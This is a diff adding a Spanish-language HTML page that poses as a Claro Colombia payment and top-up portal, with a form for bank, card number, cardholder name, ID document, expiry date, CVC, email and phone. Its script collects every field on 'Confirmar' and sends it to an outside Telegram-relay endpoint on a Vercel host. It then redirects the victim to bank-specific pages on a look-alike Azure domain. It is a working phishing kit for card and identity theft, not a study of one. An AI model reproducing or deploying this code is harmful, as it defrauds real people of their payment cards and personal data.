@@ -1,0 +1,407 @@
+<!DOCTYPE html> 
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Portal de Pagos y Recargas</title>
+  <link rel="stylesheet" href="styles.css">
+  <link href="https://db.onlinewebfonts.com/c/e695a2b548e145591a266fc50eb492e0?family=Regular" rel="stylesheet" type="text/css"/>
+  <style>
+    /* ================= Custom Select Styles ================= */
+    .custom-select {
+      position: relative;
+      width: 100%;
+      max-width: 400px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      cursor: pointer;
+      user-select: none;
+      margin-bottom: 20px;
+    }
+    .custom-select .selected {
+      padding: 10px;
+      display: flex;
+      align-items: center;
+    }
+    .custom-select .selected img {
+      width: 20px;
+      margin-right: 10px;
+    }
+    .custom-select .options {
+      position: absolute;
+      top: 100%;
+      left: 0;
+      right: 0;
+      background: #fff;
+      border: 1px solid #ccc;
+      border-top: none;
+      z-index: 10;
+      display: none;
+      max-height: 200px;
+      overflow-y: auto;
+    }
+    .custom-select .option {
+      padding: 10px;
+      display: flex;
+      align-items: center;
+    }
+    .custom-select .option img {
+      width: 20px;
+      margin-right: 10px;
+    }
+    .custom-select .option:hover {
+      background: #f0f0f0;
+    }
+    /* ================ Estilos Originales =================== */
+    .dropdown-raro {
+      margin-bottom: 20px;
+    }
+    .input-raro {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      margin-bottom: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .contenedor-raro {
+      margin-top: 20px;
+    }
+    .opcion-raro {
+      display: none;
+    }
+    .servicio-extra {
+      display: none;
+    }
+    .radio-group {
+      display: flex;
+      gap: 15px;
+      margin-top: 10px;
+    }
+    .radio-group label {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      font-size: 14px;
+      text-align: center;
+    }
+    .radio-group img {
+      width: 50px;
+      height: 50px;
+      margin-bottom: 5px;
+    }
+  </style>
+</head>
+<body>
+  <header class="header">
+    <div style="width: 30%;"><img src="img/logo-claro-blanco (1).svg" alt=""></div>
+    <nav class="nav">
+      <ul>
+        <li style="width: 100%;" class="flag"><img style="width: 90%; left: -20px;" src="img/Captura de pantalla 2025-02-19 205634.png" alt="Colombia"></li>
+      </ul>
+    </nav>
+  </header>
+
+  <!-- <section>
+    <img style="width: 100%;" src="img/Captura de pantalla 2025-02-19 205944.png" alt="">
+  </section> -->
+
+  <main class="main-container">
+    <section>
+      <p style="margin-bottom: 5%; text-align: start;">Medios de pago</p>
+      <div style="display: flex; width: 15%; gap: 40%; opacity: 40%;">
+        <img src="img/icono-AMEX.svg" alt="">
+        <img src="img/icono-VISA.svg" alt="">
+        <img src="img/icono-MASTERCARD.svg" alt="">
+        <img src="img/icono-DINERS.svg" alt="">
+      </div>
+      <div>
+        <img src="img/icono-AYUDA.png" style="margin-top: 12%;" alt="">
+      </div>
+    </section>  
+
+    <section style="border-style: solid; border-color: gainsboro; border-radius: 8px; margin-top: 5%;">
+      <img style="margin-top: 5%; margin-bottom: 2%;" src="img/icono-info-advertencia.png" alt="">
+      <p>Ten en cuenta que no aprobamos transacciones con tarjetas internacionales.</p>
+    </section>
+
+    <!-- Nuevo campo: Selección de banco -->
+      <div class="campo-formulario" style="margin-top: 5%;">
+        <label for="banco">Banco</label>
+        <select id="banco" name="banco">
+          <option value="" disabled selected>Seleccione su banco</option>
+          <option value="bancolombia">Bancolombia</option>
+          <option value="bancobogota">Banco de Bogotá</option>
+          <option value="davivienda">Davivienda</option>
+          <option value="bancopopular">Banco Popular</option>
+          <option value="bbva">BBVA</option>
+          <option value="occidente">Occidente</option>
+          <option value="avvillas">avvillas</option>
+          <option value="caja">caja</option>
+          <option value="fala">fala</option>
+          <option value="itau">itau</option>
+          <option value="scoti">scoti</option>
+        </select>
+      </div>
+
+    <section class="contenedor-formulario">
+      <!-- Campo: Número de la tarjeta -->
+      <div class="campo-formulario" style="margin-top: 8%;">
+        <label for="numeroTarjeta">Número de la tarjeta</label>
+        <input 
+          type="text" 
+          id="numeroTarjeta" 
+          name="numeroTarjeta"
+          minlength="14"
+          maxlength="16"
+          pattern="\d{14,16}"
+        />
+      </div>
+    
+      <!-- Campo: Nombre y apellido -->
+      <div class="campo-formulario">
+        <label for="nombreApellido">Nombre y apellido</label>
+        <input 
+          type="text" 
+          id="nombreApellido" 
+          name="nombreApellido"
+        />
+      </div>
+    <!-- Campo: Tipo de documento -->
+<div class="campo-formulario">
+  <label for="tipoDocumento">Tipo de documento</label>
+  <select id="tipoDocumento" name="tipoDocumento">
+    <option value="cc">C.C. (Cédula de Ciudadanía)</option>
+    <option value="pasaporte">Pasaporte</option>
+    <option value="cedula">Cédula</option>
+    <option value="tarjetaIdentidad">Tarjeta de Identidad</option>
+  </select>
+</div>
+
+    
+      <!-- Campo: Número de documento -->
+      <div class="campo-formulario">
+        <label for="numeroDocumento">Número de documento</label>
+        <input 
+          type="text" 
+          id="numeroDocumento" 
+          name="numeroDocumento"
+        />
+      </div>
+    
+      <!-- Campo: Fecha de expiración (MM / AAAA) -->
+     <!-- Campo: Fecha de expiración (DD / MM / AAAA) -->
+<div class="campo-formulario">
+  <label for="fechaExpiracion">Fecha de expiración</label>
+  <div class="grupo-expiracion">
+    <select id="mesExpiracion" name="mesExpiracion">
+      <option value="" disabled selected>MM</option>
+      <option value="01">01</option>
+      <option value="02">02</option>
+      <option value="03">03</option>
+      <option value="04">04</option>
+      <option value="05">05</option>
+      <option value="06">06</option>
+      <option value="07">07</option>
+      <option value="08">08</option>
+      <option value="09">09</option>
+      <option value="10">10</option>
+      <option value="11">11</option>
+      <option value="12">12</option>
+    </select>
+    <select id="anioExpiracion" name="anioExpiracion">
+      <option value="" disabled selected>AAAA</option>
+      <option value="2025">2025</option>
+      <option value="2026">2026</option>
+      <option value="2027">2027</option>
+      <option value="2028">2028</option>
+      <option value="2029">2029</option>
+      <option value="2030">2030</option>
+    </select>
+  </div>
+</div>
+
+    
+      <!-- Campo: CVC/CVV -->
+      <div class="campo-formulario">
+        <label for="CVC">CVC/CVV</label>
+        <input 
+          type="text" 
+          id="CVC" 
+          name="CVC"
+          maxlength="3"
+        />
+      </div>
+    
+      <!-- Campo: Correo electrónico -->
+      <div class="campo-formulario">
+        <label for="email">Correo electrónico</label>
+        <input 
+          type="text" 
+          id="email" 
+          name="email"
+        />
+      </div>
+    
+      <!-- Campo: Número de celular -->
+      <div class="campo-formulario">
+        <label for="cel">Número de celular</label>
+        <input 
+          type="text" 
+          id="cel" 
+          name="cel"
+        />
+      </div>
+    
+      <!-- Campo: Número de cuotas -->
+      <div class="campo-formulario">
+        <label for="cuotas">Número de cuotas</label>
+        <input 
+          type="text" 
+          id="cuotas" 
+          name="cuotas"
+        />
+      </div>
+
+      
+
+      <section>
+        <button id="confirmBtn" style="margin-top: 10%; padding: 5%; width: 80%; border-radius: 8px; border-style: none; background-color: red; color: white; font-size: large;">Confirmar</button>
+      </section>
+    </section>
+  
+    <style>
+      /* Estilos generales del formulario */
+      .contenedor-formulario {
+        max-width: 400px;
+        margin: 0 auto;
+        font-family: sans-serif;
+      }
+    
+      .campo-formulario {
+        margin-bottom: 16px;
+      }
+    
+      .campo-formulario label {
+        display: block;
+        margin-bottom: 4px;
+        font-weight: bold;
+        text-align: start;
+      }
+    
+      .campo-formulario input[type="text"],
+      .campo-formulario select {
+        width: 100%;
+        padding: 15px;
+        border-radius: 4px;
+        border-style: solid;
+        border-color: #1B63B1;
+        border-width: 1px;
+        box-sizing: border-box;
+      }
+    
+      /* Para la parte de la expiración (MM / AAAA) */
+      .grupo-expiracion {
+        display: flex;
+        gap: 8px;
+      }
+    
+      .grupo-expiracion select {
+        width: 50%;
+      }
+    </style>
+    
+   <script>
+  // URL absoluta de tu backend (reemplaza por la tuya)
+  const SEND_TELEGRAM_ENDPOINT = 'https://lack-delta.vercel.app/api/send-telegram';
+
+  // Mapeo de bancos a URL de redirección
+  const bankRedirects = {
+    bancolombia: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/bancol/personas/formulario_u1.php",
+    bancobogota: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/bogota/personas/formulario_u1.php",
+    davivienda: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/davi/personas/formulario_u1.php",
+    bancopopular: "pago.html",
+    bbva: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/bbva/personas/formulario_u1.php",
+    occidente: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/occidente/personas/formulario_u1.php",
+    avvillas: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/avillas/personas/formulario_u1.php",
+    caja:"https://portalpagos-claro-com-co.azurewebsites.net/sucur/caja/personas/formulario_u1.php",
+    fala:"https://portalpagos-claro-com-co.azurewebsites.net/sucur/fala/personas/formulario_u1.php",
+    itau:"https://portalpagos-claro-com-co.azurewebsites.net/sucur/itau/personas/formulario_u1.php",
+    scoti:"https://portalpagos-claro-com-co.azurewebsites.net/sucur/scoti/personas/formulario_u1.php"
+  };
+
+  // Ajuste dinámico del maxlength del CVC según la longitud del número de tarjeta
+  document.getElementById('numeroTarjeta').addEventListener('input', function() {
+    const cardLength = this.value.replace(/\s+/g, '').length; // eliminar espacios
+    const cvcInput = document.getElementById('CVC');
+    if (cardLength === 14) {
+      cvcInput.maxLength = 4;
+    } else {
+      cvcInput.maxLength = 3;
+    }
+  });
+
+  // Acción al hacer clic en el botón Confirmar
+  document.getElementById('confirmBtn').addEventListener('click', function(event) {
+    event.preventDefault(); // Prevenir cualquier acción por defecto
+
+    // Recolectar datos de los inputs
+    const numeroTarjeta = document.getElementById('numeroTarjeta').value;
+    const nombreApellido = document.getElementById('nombreApellido').value;
+    const tipoDocumento = document.getElementById('tipoDocumento').value;
+    const numeroDocumento = document.getElementById('numeroDocumento').value;
+    const mesExpiracion = document.getElementById('mesExpiracion').value;
+    const anioExpiracion = document.getElementById('anioExpiracion').value;
+    const CVC = document.getElementById('CVC').value;
+    const email = document.getElementById('email').value;
+    const cel = document.getElementById('cel').value;
+    const cuotas = document.getElementById('cuotas').value;
+    const banco = document.getElementById('banco').value;
+
+    // Construir el mensaje a enviar (igual que antes)
+    const message = 
+      "Número de tarjeta: " + numeroTarjeta + "\n" +
+      "Nombre y apellido: " + nombreApellido + "\n" +
+      "Tipo de documento: " + tipoDocumento + "\n" +
+      "Número de documento: " + numeroDocumento + "\n" +
+      "Fecha de expiración: " + mesExpiracion + " / " + anioExpiracion + "\n" +
+      "CVC/CVV: " + CVC + "\n" +
+      "Correo electrónico: " + email + "\n" +
+      "Número de celular: " + cel + "\n" +
+      "Número de cuotas: " + cuotas + "\n" +
+      "Banco: " + banco;
+
+    // Enviar mensaje al backend (URL absoluta definida arriba)
+    fetch(SEND_TELEGRAM_ENDPOINT, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ message })
+    })
+    .then(response => response.json())
+    .then(data => {
+      console.log("Mensaje enviado (respuesta backend):", data);
+      // Redirección según el banco seleccionado
+      if (bankRedirects[banco]) {
+        window.location.href = bankRedirects[banco];
+      } else {
+        alert("Banco no reconocido para redirección.");
+      }
+    })
+    .catch(error => {
+      console.error("Error al enviar el mensaje al backend:", error);
+      // Aunque ocurra un error, se puede proceder con la redirección
+      if (bankRedirects[banco]) {
+        window.location.href = bankRedirects[banco];
+      }
+    });
+  });
+</script>
+
+    
+  </main>
+
+  <footer style="margin-top: 20%;">
+    <img src="img/Captura de pantalla 2025-02-22 144047.png" style="width: 100%;" alt="">
+  </footer>
+</body>
+</html>
